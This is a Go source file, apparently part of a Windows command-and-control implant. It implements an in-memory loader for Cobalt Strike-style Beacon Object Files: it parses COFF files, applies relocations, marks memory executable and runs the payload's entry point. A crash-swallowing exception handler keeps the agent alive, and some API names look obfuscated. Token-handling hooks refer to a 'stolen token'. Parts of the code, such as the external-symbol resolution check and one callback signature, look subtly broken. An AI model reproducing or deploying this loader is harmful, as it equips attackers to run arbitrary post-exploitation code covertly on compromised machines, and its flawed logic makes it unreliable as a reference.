//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── VEH Crash Isolation ──────────────────────────────────────────────────────
var (
	vehKernel32   = syscall.NewLazyDLL("kernel32.dll")
	procAddVeh    = vehKernel32.NewProc(s(SProcAddVEH))
	procRemoveVeh = vehKernel32.NewProc(s(SProcRemVEH))

	vehHandle    uintptr
	vehInstalled bool
)

const (
	exceptionExecuteHandler = 1
	exceptionContinueSearch = 0
)

// vehCallback is the Vectored Exception Handler callback.
// Returns EXCEPTION_EXECUTE_HANDLER to resume after the faulting instruction
// for known crash exceptions, or EXCEPTION_CONTINUE_SEARCH otherwise.
func vehCallback(exceptionPointers uintptr) uintptr {
	if exceptionPointers == 0 {
		return exceptionContinueSearch
	}
	// EXCEPTION_POINTERS layout: { ExceptionRecord *EXCEPTION_RECORD, ContextRecord *CONTEXT }
	// Follow first pointer to get EXCEPTION_RECORD base
	exceptionRecord := *(*uintptr)(unsafe.Pointer(exceptionPointers))
	if exceptionRecord == 0 {
		return exceptionContinueSearch
	}
	// Read ExceptionCode (first DWORD of EXCEPTION_RECORD)
	code := *(*uint32)(unsafe.Pointer(exceptionRecord))

	switch code {
	case 0xC0000005, // EXCEPTION_ACCESS_VIOLATION
		0xC0000094, // EXCEPTION_INT_DIVIDE_BY_ZERO
		0xC00000FD, // EXCEPTION_STACK_OVERFLOW
		0xC000001D: // EXCEPTION_ILLEGAL_INSTRUCTION
		if Debug {
			fmt.Printf("[bof] VEH caught exception 0x%08X, resuming\n", code)
		}
		return exceptionExecuteHandler
	}
	return exceptionContinueSearch
}

func installVEH() {
	if vehInstalled {
		return
	}
	callback := syscall.NewCallback(vehCallback)
	// AddVectoredExceptionHandler(firstHandler, handler) -> PVOID
	ret, _, _ := procAddVeh.Call(1, callback)
	if ret == 0 {
		if Debug {
			fmt.Printf("[bof] VEH install failed\n")
		}
		return
	}
	vehHandle = ret
	vehInstalled = true
}

func removeVEH() {
	if !vehInstalled {
		return
	}
	procRemoveVeh.Call(vehHandle)
	vehInstalled = false
	vehHandle = 0
}

// ── COFF / BOF Loader ──────────────────────────────────────────────────────────

var (
	bofNtdll    = syscall.NewLazyDLL("ntdll.dll")
	bofKernel32 = syscall.NewLazyDLL("kernel32.dll")
	bofUser32   = syscall.NewLazyDLL("user32.dll")
	bofAdvapi32 = syscall.NewLazyDLL("advapi32.dll")
	bofWs2_32   = syscall.NewLazyDLL("ws2_32.dll")
	bofNetapi32 = syscall.NewLazyDLL("netapi32.dll")
	bofOleaut32 = syscall.NewLazyDLL("oleaut32.dll")
	bofOle32    = syscall.NewLazyDLL("ole32.dll")
	bofIphlpapi = syscall.NewLazyDLL("iphlpapi.dll")
)

// bofMemcpy copies n bytes from src to dst using unsafe pointers.
// Equivalent to C's memcpy, needed because syscall.Memcpy is not available.
func bofMemcpy(dst, src unsafe.Pointer, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		// Byte-by-byte copy: raw pointer memcpy for COFF section loading
		*(*byte)(unsafe.Pointer(uintptr(dst) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
	}
}

// bofGoString converts a C string pointer (uintptr) to Go string.
// Replaces syscall.GoString which is not available on all Go versions.
func bofGoString(p uintptr) string {
	if p == 0 {
		return ""
	}
	var b []byte
	for {
		// Byte-by-byte read from C string pointer (null-terminated)
		c := *(*byte)(unsafe.Pointer(p))
		if c == 0 {
			break
		}
		b = append(b, c)
		p++
	}
	return string(b)
}

func getProcAddr(name string) uintptr {
	for _, dll := range []*syscall.LazyDLL{bofNtdll, bofKernel32, bofUser32, bofAdvapi32, bofWs2_32, bofNetapi32, bofOleaut32, bofOle32, bofIphlpapi} {
		proc := dll.NewProc(name)
		if proc != nil && proc.Find() == nil {
			return proc.Addr()
		}
	}
	return 0
}

type coffFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}

type coffSymbol struct {
	NameBytes     [8]byte
	Value         uint32
	SectionNumber int16
	Type          uint16
	StorageClass  uint8
	NumberOfAux   uint8
}

func (s *coffSymbol) Name(stringTable []byte) string {
	if s.NameBytes[0] == 0 && s.NameBytes[1] == 0 && s.NameBytes[2] == 0 && s.NameBytes[3] == 0 {
		offset := binary.LittleEndian.Uint32(s.NameBytes[4:8])
		if offset > 0 && offset < uint32(len(stringTable)) {
			end := offset
			for end < uint32(len(stringTable)) && stringTable[end] != 0 {
				end++
			}
			return string(stringTable[offset:end])
		}
	}
	end := 0
	for end < 8 && s.NameBytes[end] != 0 {
		end++
	}
	return string(s.NameBytes[:end])
}

const (
	IMAGE_REL_AMD64_ABSOLUTE = 0x0000
	IMAGE_REL_AMD64_ADDR64   = 0x0001
	IMAGE_REL_AMD64_ADDR32   = 0x0002
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32    = 0x0004
	IMAGE_REL_AMD64_REL32_1  = 0x0005
	IMAGE_REL_AMD64_REL32_2  = 0x0006
	IMAGE_REL_AMD64_REL32_3  = 0x0007
	IMAGE_REL_AMD64_REL32_4  = 0x0008
	IMAGE_REL_AMD64_REL32_5  = 0x0009
	IMAGE_REL_AMD64_SECTION  = 0x000A
	IMAGE_REL_AMD64_SECREL   = 0x000B
)

type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

// bofLoadedSect tracks a loaded section
type bofLoadedSect struct {
	header   coffSectionHeader
	data     []byte
	baseAddr uintptr
}

// ── BOF Runtime State ──────────────────────────────────────────────────────────

// BOF output capture
var bofOutputBuf strings.Builder

// callbackTable mirrors CS BOF API function table
type callbackTable struct {
	Printf      uintptr
	Output      uintptr
	DataParse   uintptr
	DataInt     uintptr
	DataShort   uintptr
	DataLen     uintptr
	DataExtract uintptr
	DataString  uintptr
	// Stubs for security-related Beacon APIs — return FALSE/0 safely
	BeaconUseToken               uintptr
	BeaconRevertToken            uintptr
	BeaconIsAdmin                uintptr
	BeaconInjectProcess          uintptr
	BeaconInjectTemporaryProcess uintptr
	BeaconSpawnTemporaryProcess  uintptr
	BeaconCleanupProcess         uintptr
	BeaconInformation            uintptr
	BeaconGetCustomUserData      uintptr
	BeaconSetCustomUserData      uintptr
	BeaconCheckMsfPayload        uintptr
}

// exportedBeaconAPI is the function table passed to BOF (referenced as __imp_Beacon*)
var exportedBeaconAPI = callbackTable{}

// BOF data structures (must match CS beacon.h layout)
// BeaconDataParse struct layout used by BOF
type beaconDataParse struct {
	Original  uintptr
	Buffer    uintptr
	Length    int32
	Size      int32
	Indicator int32
}

// executeBOF loads and runs a BOF from COFF data with arguments.
// Wraps execution with VEH crash isolation to prevent agent crashes.
func executeBOF(bofData []byte, args string) (string, error) {
	bofOutputBuf.Reset()

	installVEH()
	defer removeVEH()

	entryAddr, err := loadAndRunBOF(bofData, args)
	if err != nil {
		return "", err
	}
	_ = entryAddr

	return bofOutputBuf.String(), nil
}

func loadAndRunBOF(bofData []byte, args string) (uintptr, error) {
	// Parse COFF header
	if len(bofData) < 20 {
		return 0, fmt.Errorf("bof: file too small for COFF header")
	}
	var fh coffFileHeader
	fh.Machine = binary.LittleEndian.Uint16(bofData[0:2])
	fh.NumberOfSections = binary.LittleEndian.Uint16(bofData[2:4])
	fh.TimeDateStamp = binary.LittleEndian.Uint32(bofData[4:8])
	fh.PointerToSymbolTable = binary.LittleEndian.Uint32(bofData[8:12])
	fh.NumberOfSymbols = binary.LittleEndian.Uint32(bofData[12:16])
	fh.SizeOfOptionalHeader = binary.LittleEndian.Uint16(bofData[16:18])
	fh.Characteristics = binary.LittleEndian.Uint16(bofData[18:20])

	if fh.Machine != 0x8664 {
		return 0, fmt.Errorf("bof: only x64 COFF supported (machine=0x%x)", fh.Machine)
	}

	// Section headers start after file header + optional header
	sectOffset := 20 + int(fh.SizeOfOptionalHeader)
	if sectOffset+int(fh.NumberOfSections)*40 > len(bofData) {
		return 0, fmt.Errorf("bof: file too small for section headers")
	}

	// Parse sections
	sections := make([]coffSectionHeader, fh.NumberOfSections)
	for i := 0; i < int(fh.NumberOfSections); i++ {
		off := sectOffset + i*40
		copy(sections[i].Name[:], bofData[off:off+8])
		sections[i].VirtualSize = binary.LittleEndian.Uint32(bofData[off+8 : off+12])
		sections[i].VirtualAddress = binary.LittleEndian.Uint32(bofData[off+12 : off+16])
		sections[i].SizeOfRawData = binary.LittleEndian.Uint32(bofData[off+16 : off+20])
		sections[i].PointerToRawData = binary.LittleEndian.Uint32(bofData[off+20 : off+24])
		sections[i].PointerToRelocations = binary.LittleEndian.Uint32(bofData[off+24 : off+28])
		sections[i].PointerToLineNumbers = binary.LittleEndian.Uint32(bofData[off+28 : off+32])
		sections[i].NumberOfRelocations = binary.LittleEndian.Uint16(bofData[off+32 : off+34])
		sections[i].NumberOfLineNumbers = binary.LittleEndian.Uint16(bofData[off+34 : off+36])
		sections[i].Characteristics = binary.LittleEndian.Uint32(bofData[off+36 : off+40])
	}

	// Load string table
	stringTable := []byte{}
	if fh.PointerToSymbolTable > 0 {
		stOff := int(fh.PointerToSymbolTable) + int(fh.NumberOfSymbols)*18
		if stOff < len(bofData) {
			stringTable = bofData[stOff:]
		}
	}

	// Allocate memory for each section
	loaded := make([]bofLoadedSect, len(sections))
	for i := range sections {
		sh := &sections[i]
		size := sh.SizeOfRawData
		if size == 0 {
			size = sh.VirtualSize
		}
		if size == 0 {
			continue
		}
		addr, err := windows.VirtualAlloc(0, uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil || addr == 0 {
			return 0, fmt.Errorf("bof: VirtualAlloc failed for section %d", i)
		}
		loaded[i].header = *sh
		loaded[i].baseAddr = addr

		if int(sh.PointerToRawData)+int(sh.SizeOfRawData) <= len(bofData) && sh.SizeOfRawData > 0 {
			src := bofData[sh.PointerToRawData : sh.PointerToRawData+sh.SizeOfRawData]
			bofMemcpy(unsafe.Pointer(addr), unsafe.Pointer(&src[0]), uintptr(len(src)))
		}
	}

	// Change executable sections to PAGE_EXECUTE_READ after data is written
	for i := range loaded {
		if loaded[i].baseAddr == 0 {
			continue
		}
		if loaded[i].header.Characteristics&0x20000000 != 0 {
			sz := loaded[i].header.SizeOfRawData
			if sz == 0 {
				sz = loaded[i].header.VirtualSize
			}
			if sz > 0 {
				var oldProt uint32
				windows.VirtualProtect(loaded[i].baseAddr, uintptr(sz), windows.PAGE_EXECUTE_READ, &oldProt)
			}
		}
	}

	// Build symbol map: symbol name -> section index + value
	type symInfo struct {
		sectionIdx   int
		value        uint32
		storageClass uint8
		isExternal   bool
		isFunction   bool
	}
	symbols := make(map[string]symInfo)

	if fh.PointerToSymbolTable > 0 {
		symOff := int(fh.PointerToSymbolTable)
		for i := 0; i < int(fh.NumberOfSymbols); i++ {
			off := symOff + i*18
			if off+18 > len(bofData) {
				break
			}
			var sym coffSymbol
			copy(sym.NameBytes[:], bofData[off:off+8])
			sym.Value = binary.LittleEndian.Uint32(bofData[off+8 : off+12])
			sym.SectionNumber = int16(binary.LittleEndian.Uint16(bofData[off+12 : off+14]))
			sym.Type = binary.LittleEndian.Uint16(bofData[off+14 : off+16])
			sym.StorageClass = bofData[off+16]
			sym.NumberOfAux = bofData[off+17]

			name := sym.Name(stringTable)
			if name == "" {
				continue
			}
			si := symInfo{
				value:        sym.Value,
				storageClass: sym.StorageClass,
			}
			// IMAGE_SYM_CLASS_EXTERNAL = 2
			si.isExternal = sym.StorageClass == 2
			// IMAGE_SYM_DTYPE_FUNCTION = 0x20 (bits in Type)
			si.isFunction = (sym.Type>>4)&0x20 != 0

			if sym.SectionNumber > 0 && int(sym.SectionNumber) <= len(sections) {
				si.sectionIdx = int(sym.SectionNumber) - 1
			} else if sym.SectionNumber == -1 {
				si.sectionIdx = -1 // absolute symbol
			}

			symbols[name] = si

			// Skip aux symbols
			i += int(sym.NumberOfAux)
		}
	}

	// Setup Beacon API callbacks
	setupBeaconAPI()

	// Resolve external symbols (undefined symbols = Win32 API or Beacon API)
	// BOF external symbols reference functions like "BeaconPrintf" or "MessageBoxA"
	for name, si := range symbols {
		if si.isExternal && si.sectionIdx < 0 && si.sectionIdx != -1 {
			// This is an undefined external symbol - need to resolve
			var resolved uintptr

			// Check if it's a Beacon API function
			switch name {
			case "BeaconPrintf":
				resolved = exportedBeaconAPI.Printf
			case "BeaconOutput":
				resolved = exportedBeaconAPI.Output
			case "BeaconDataParse":
				resolved = exportedBeaconAPI.DataParse
			case "BeaconDataInt":
				resolved = exportedBeaconAPI.DataInt
			case "BeaconDataShort":
				resolved = exportedBeaconAPI.DataShort
			case "BeaconDataLength":
				resolved = exportedBeaconAPI.DataLen
			case "BeaconDataExtract":
				resolved = exportedBeaconAPI.DataExtract
			case "BeaconDataString":
				resolved = exportedBeaconAPI.DataString
			case "BeaconUseToken":
				resolved = exportedBeaconAPI.BeaconUseToken
			case "BeaconRevertToken":
				resolved = exportedBeaconAPI.BeaconRevertToken
			case "BeaconIsAdmin":
				resolved = exportedBeaconAPI.BeaconIsAdmin
			case "BeaconInjectProcess":
				resolved = exportedBeaconAPI.BeaconInjectProcess
			case "BeaconInjectTemporaryProcess":
				resolved = exportedBeaconAPI.BeaconInjectTemporaryProcess
			case "BeaconSpawnTemporaryProcess":
				resolved = exportedBeaconAPI.BeaconSpawnTemporaryProcess
			case "BeaconCleanupProcess":
				resolved = exportedBeaconAPI.BeaconCleanupProcess
			case "BeaconInformation":
				resolved = exportedBeaconAPI.BeaconInformation
			case "BeaconGetCustomUserData":
				resolved = exportedBeaconAPI.BeaconGetCustomUserData
			case "BeaconSetCustomUserData":
				resolved = exportedBeaconAPI.BeaconSetCustomUserData
			case "BeaconCheckMsfPayload":
				resolved = exportedBeaconAPI.BeaconCheckMsfPayload
			default:
				// Try Win32 API
				resolved = getProcAddr(name)
			}

			if resolved == 0 {
				if Debug {
					fmt.Printf("[bof] unresolved symbol: %s\n", name)
				}
				// Leave as 0 — BOF should check for null before calling
			}

			// Replace symbol value with resolved address
			si.value = uint32(resolved)
			si.sectionIdx = -1 // mark as absolute
			symbols[name] = si

			// For __imp_ style symbols (dllimport), also resolve
			impName := "__imp_" + name
			if _, ok := symbols[impName]; ok {
				sym2 := symbols[impName]
				sym2.value = uint32(resolved)
				sym2.sectionIdx = -1
				symbols[impName] = sym2
			}
		}
	}

	// Apply relocations
	for i := range sections {
		sh := &sections[i]
		if sh.NumberOfRelocations == 0 {
			continue
		}
		relOff := int(sh.PointerToRelocations)
		for j := 0; j < int(sh.NumberOfRelocations); j++ {
			off := relOff + j*10
			if off+10 > len(bofData) {
				break
			}
			var rel coffRelocation
			rel.VirtualAddress = binary.LittleEndian.Uint32(bofData[off : off+4])
			rel.SymbolTableIndex = binary.LittleEndian.Uint32(bofData[off+4 : off+8])
			rel.Type = binary.LittleEndian.Uint16(bofData[off+8 : off+10])

			// Target address in loaded section
			targetAddr := loaded[i].baseAddr + uintptr(rel.VirtualAddress)

			// Find symbol
			symName := ""
			symVal := uint32(0)
			symSection := -1
			symIsAbsolute := false

			if fh.PointerToSymbolTable > 0 {
				symOff := int(fh.PointerToSymbolTable) + int(rel.SymbolTableIndex)*18
				if symOff+18 <= len(bofData) {
					var sym coffSymbol
					copy(sym.NameBytes[:], bofData[symOff:symOff+8])
					sym.Value = binary.LittleEndian.Uint32(bofData[symOff+8 : symOff+12])
					sym.SectionNumber = int16(binary.LittleEndian.Uint16(bofData[symOff+12 : symOff+14]))
					symName = sym.Name(stringTable)

					if info, ok := symbols[symName]; ok {
						symVal = info.value
						symSection = info.sectionIdx
						symIsAbsolute = info.sectionIdx == -1
					} else {
						symVal = sym.Value
						if sym.SectionNumber > 0 && int(sym.SectionNumber) <= len(sections) {
							symSection = int(sym.SectionNumber) - 1
						} else if sym.SectionNumber == -1 {
							symIsAbsolute = true
						}
					}
				}
			}

			// Calculate symbol address
			var symAddr uintptr
			if symIsAbsolute {
				symAddr = uintptr(symVal)
			} else if symSection >= 0 && symSection < len(loaded) {
				symAddr = loaded[symSection].baseAddr + uintptr(symVal)
			} else {
				// Undefined section - treat as zero
				symAddr = 0
			}

			switch rel.Type {
			case IMAGE_REL_AMD64_ABSOLUTE:
				// No-op
			case IMAGE_REL_AMD64_ADDR64:
				// Write full 64-bit absolute address into relocation target
				*(*uint64)(unsafe.Pointer(targetAddr)) = uint64(symAddr)
			case IMAGE_REL_AMD64_ADDR32:
				// Write 32-bit absolute address (truncated)
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(symAddr)
			case IMAGE_REL_AMD64_ADDR32NB:
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(symAddr)
			case IMAGE_REL_AMD64_REL32:
				// Write 32-bit RIP-relative offset: symAddr - targetAddr - 4
				delta := uint64(symAddr) - uint64(targetAddr) - 4
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
			case IMAGE_REL_AMD64_REL32_1:
				// REL32 with 1-byte displacement adjustment
				delta := uint64(symAddr) - uint64(targetAddr) - 5
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
			case IMAGE_REL_AMD64_REL32_2:
				delta := uint64(symAddr) - uint64(targetAddr) - 6
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
			case IMAGE_REL_AMD64_REL32_3:
				delta := uint64(symAddr) - uint64(targetAddr) - 7
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
			case IMAGE_REL_AMD64_REL32_4:
				delta := uint64(symAddr) - uint64(targetAddr) - 8
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
			case IMAGE_REL_AMD64_REL32_5:
				delta := uint64(symAddr) - uint64(targetAddr) - 9
				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
			case IMAGE_REL_AMD64_SECTION:
				// Write 16-bit section index (1-based)
				if symSection >= 0 {
					*(*uint16)(unsafe.Pointer(targetAddr)) = uint16(symSection + 1)
				}
			case IMAGE_REL_AMD64_SECREL:
				// Write 32-bit section-relative offset for TLS/SEH
				if symSection >= 0 {
					*(*uint32)(unsafe.Pointer(targetAddr)) = symVal
				}
			}
		}
	}

	// Find entry point (symbol named "go")
	entryPoint := uintptr(0)
	for name, si := range symbols {
		if name == "go" {
			if si.sectionIdx >= 0 && si.sectionIdx < len(loaded) {
				entryPoint = loaded[si.sectionIdx].baseAddr + uintptr(si.value)
			} else if si.sectionIdx == -1 {
				entryPoint = uintptr(si.value)
			}
			break
		}
	}
	if entryPoint == 0 {
		return 0, fmt.Errorf("bof: entry point 'go' not found")
	}

	// Parse BOF arguments
	argsData := packBOFArgs(args)

	// Setup BeaconDataParse for arguments
	var parser beaconDataParse
	if len(argsData) > 0 {
		argsPtr, err := windows.VirtualAlloc(0, uintptr(len(argsData)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil || argsPtr == 0 {
			return 0, fmt.Errorf("bof: VirtualAlloc for args failed")
		}
		defer windows.VirtualFree(argsPtr, 0, windows.MEM_RELEASE)
		bofMemcpy(unsafe.Pointer(argsPtr), unsafe.Pointer(&argsData[0]), uintptr(len(argsData)))
		parser.Original = argsPtr
		parser.Buffer = argsPtr
		parser.Length = int32(len(argsData))
		parser.Size = int32(len(argsData))
		parser.Indicator = 0
	}

	// Call the entry point
	// Cast raw entry point address to Go function pointer and invoke BOF "go" entry
	goFunc := *(*func(ptr uintptr))(unsafe.Pointer(&entryPoint))
	goFunc(uintptr(unsafe.Pointer(&parser)))

	return entryPoint, nil
}

// packBOFArgs packs argument string into BOF-compatible format
// Format: for each space-separated arg, pack as 2-byte len + data
func packBOFArgs(args string) []byte {
	if args == "" {
		return nil
	}
	parts := strings.Fields(args)
	buf := make([]byte, 0, 1024)
	for _, p := range parts {
		if len(p) > 0xFFFF {
			continue
		}
		// 2-byte LE length + string data
		lenBytes := make([]byte, 2)
		binary.LittleEndian.PutUint16(lenBytes, uint16(len(p)))
		buf = append(buf, lenBytes...)
		buf = append(buf, []byte(p)...)
	}
	return buf
}

// setupBeaconAPI populates the callback table with function pointers
func setupBeaconAPI() {
	// Use text/trick: define function variables that point to Go functions
	exportedBeaconAPI = callbackTable{
		Printf:      uintptr(syscall.NewCallback(bofBeaconPrintf)),
		Output:      uintptr(syscall.NewCallback(bofBeaconOutput)),
		DataParse:   uintptr(syscall.NewCallback(bofDataParse)),
		DataInt:     uintptr(syscall.NewCallback(bofDataInt)),
		DataShort:   uintptr(syscall.NewCallback(bofDataShort)),
		DataLen:     uintptr(syscall.NewCallback(bofDataLength)),
		DataExtract: uintptr(syscall.NewCallback(bofDataExtract)),
		DataString:  uintptr(syscall.NewCallback(bofDataString)),
		// Stubs that return FALSE/0 safely — no token ops or process injection
		BeaconUseToken:               uintptr(syscall.NewCallback(bofBeaconUseToken)),
		BeaconRevertToken:            uintptr(syscall.NewCallback(bofBeaconRevertToken)),
		BeaconIsAdmin:                uintptr(syscall.NewCallback(bofBeaconIsAdmin)),
		BeaconInjectProcess:          uintptr(syscall.NewCallback(bofStubInjectProcess)),
		BeaconInjectTemporaryProcess: uintptr(syscall.NewCallback(bofStubInjectTemporaryProcess)),
		BeaconSpawnTemporaryProcess:  uintptr(syscall.NewCallback(bofStubSpawnTemporaryProcess)),
		BeaconCleanupProcess:         uintptr(syscall.NewCallback(bofStubCleanupProcess)),
		BeaconInformation:            uintptr(syscall.NewCallback(bofStubInformation)),
		BeaconGetCustomUserData:      uintptr(syscall.NewCallback(bofStubGetCustomUserData)),
		BeaconSetCustomUserData:      uintptr(syscall.NewCallback(bofStubSetCustomUserData)),
		BeaconCheckMsfPayload:        uintptr(syscall.NewCallback(bofStubCheckMsfPayload)),
	}
}

// ── BOF API Callbacks (C-callable) ─────────────────────────────────────────────

// bofBeaconPrintf implements BeaconPrintf callback
// type: CALLBACK_OUTPUT=0, CALLBACK_ERROR=0xd
func bofBeaconPrintf(typ int32, data uintptr, args ...byte) int32 {
	// This is a C callback - data points to a format string
	if data == 0 {
		return 0
	}
	str := bofGoString(data)
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString(str)
	return 0
}

// bofBeaconOutput implements BeaconOutput callback
func bofBeaconOutput(typ int32, data uintptr, length int32) int32 {
	if data == 0 || length <= 0 {
		return 0
	}
	buf := make([]byte, length)
	bofMemcpy(unsafe.Pointer(&buf[0]), unsafe.Pointer(data), uintptr(length))
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.Write(buf)
	return 0
}

// bofDataParse implements BeaconDataParse
func bofDataParse(parser uintptr, buffer uintptr, size int32) int32 {
	if parser == 0 {
		return 0
	}
	p := (*beaconDataParse)(unsafe.Pointer(parser))
	p.Original = buffer
	p.Buffer = buffer
	p.Length = size
	p.Size = size
	p.Indicator = 0
	return 0
}

// bofDataInt reads a 4-byte int from parser buffer
func bofDataInt(parser uintptr) int32 {
	if parser == 0 {
		return 0
	}
	// Cast raw pointer to beaconDataParse struct for argument parsing
	p := (*beaconDataParse)(unsafe.Pointer(parser))
	if p.Length < 4 {
		p.Indicator = 1
		return 0
	}
	// Read 4-byte int from current buffer position
	val := *(*int32)(unsafe.Pointer(p.Buffer))
	p.Buffer = uintptr(unsafe.Pointer(uintptr(p.Buffer) + 4))
	p.Length -= 4
	return val
}

// bofDataShort reads a 2-byte short from parser buffer
func bofDataShort(parser uintptr) int32 {
	if parser == 0 {
		return 0
	}
	// Read 2-byte short from parser buffer
	p := (*beaconDataParse)(unsafe.Pointer(parser))
	if p.Length < 2 {
		p.Indicator = 1
		return 0
	}
	val := *(*int16)(unsafe.Pointer(p.Buffer))
	p.Buffer = uintptr(unsafe.Pointer(uintptr(p.Buffer) + 2))
	p.Length -= 2
	return int32(val)
}

// bofDataLength reads a 4-byte length
func bofDataLength(parser uintptr) int32 {
	return bofDataInt(parser)
}

// bofDataExtract extracts a string (2-byte len prefix + data)
func bofDataExtract(parser uintptr, sizeOut uintptr) uintptr {
	if parser == 0 {
		return 0
	}
	// Read 2-byte length prefix for variable-length string extraction
	p := (*beaconDataParse)(unsafe.Pointer(parser))
	if p.Length < 2 {
		p.Indicator = 1
		return 0
	}
	strLen := *(*uint16)(unsafe.Pointer(p.Buffer))
	p.Buffer = uintptr(unsafe.Pointer(uintptr(p.Buffer) + 2))
	p.Length -= 2
	if int32(strLen) > p.Length {
		p.Indicator = 1
		return 0
	}
	if sizeOut != 0 {
		// Write extracted string length back to caller's output parameter
		*(*int32)(unsafe.Pointer(sizeOut)) = int32(strLen)
	}
	result := p.Buffer
	p.Buffer = uintptr(unsafe.Pointer(uintptr(p.Buffer) + uintptr(strLen)))
	p.Length -= int32(strLen)
	return result
}

// bofDataString extracts a null-terminated string
func bofDataString(parser uintptr) uintptr {
	if parser == 0 {
		return 0
	}
	p := (*beaconDataParse)(unsafe.Pointer(parser))
	if p.Length <= 0 {
		p.Indicator = 1
		return 0
	}
	// Find null terminator
	result := p.Buffer
	ptr := uintptr(p.Buffer)
	end := ptr
	// Byte-by-byte scan for null terminator in C string
	for int32(end-ptr) < p.Length {
		if *(*byte)(unsafe.Pointer(end)) == 0 {
			end++
			break
		}
		end++
	}
	p.Buffer = uintptr(unsafe.Pointer(end))
	p.Length -= int32(end - ptr)
	return result
}

// bofStubReturnFalse is a safe stub for unimplemented Beacon APIs.
// Returns 0 (FALSE / NULL) so BOFs that check the return value won't misbehave.
func bofStubReturnFalse() int32 {
	return 0
}

// bofStubUnsupportedN writes a diagnostic to BOF output and returns FALSE.
// Used by per-API stubs so operators can see which Beacon API is unavailable.
func bofStubUnsupportedN(name uintptr) int32 {
	if name != 0 {
		n := bofGoString(name)
		if n != "" {
			if bofOutputBuf.Len() > 0 {
				bofOutputBuf.WriteString("\n")
			}
			bofOutputBuf.WriteString("[!] Beacon API not supported: ")
			bofOutputBuf.WriteString(n)
		}
	}
	return 0
}

func bofStubInjectProcess(hProc uintptr, pid uint32, remote uintptr, remoteSize int32, src uintptr, srcSize int32, outSize uintptr, mode int32) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconInjectProcess not supported in this context")
	return 0
}

func bofStubInjectTemporaryProcess(pInfo uintptr, remote uintptr, remoteSize int32, src uintptr, srcSize int32, outSize uintptr, mode int32) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconInjectTemporaryProcess not supported in this context")
	return 0
}

func bofStubSpawnTemporaryProcess(inherit int32, flags int32, pInfo uintptr) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconSpawnTemporaryProcess not supported in this context")
	return 0
}

func bofStubCleanupProcess(hProc uintptr) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconCleanupProcess not supported in this context")
	return 0
}

func bofStubInformation(info int32, buffer uintptr, size int32, outputSize uintptr) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconInformation not supported in this context")
	return 0
}

func bofStubGetCustomUserData(buffer uintptr, size uintptr) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconGetCustomUserData not supported in this context")
	return 0
}

func bofStubSetCustomUserData(buffer uintptr, size int32) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconSetCustomUserData not supported in this context")
	return 0
}

func bofStubCheckMsfPayload(uuid uintptr, buffer uintptr, size int32) int32 {
	if bofOutputBuf.Len() > 0 {
		bofOutputBuf.WriteString("\n")
	}
	bofOutputBuf.WriteString("[!] BeaconCheckMsfPayload not supported in this context")
	return 0
}

func bofBeaconIsAdmin() int32 {
	_, elevated, _ := getPlatformSecurityInfo()
	if elevated {
		return 1
	}
	return 0
}

func bofBeaconUseToken(_ uintptr) int32 {
	// Impersonate the currently stolen token if one is held.
	if err := tokenRevert(); err != nil {
		// tokenRevert on a clean thread is fine; try steal of current PID is N/A.
		_ = err
	}
	return bofBeaconIsAdmin()
}

func bofBeaconRevertToken() int32 {
	if err := tokenRevert(); err != nil {
		return 0
	}
	return 1
}
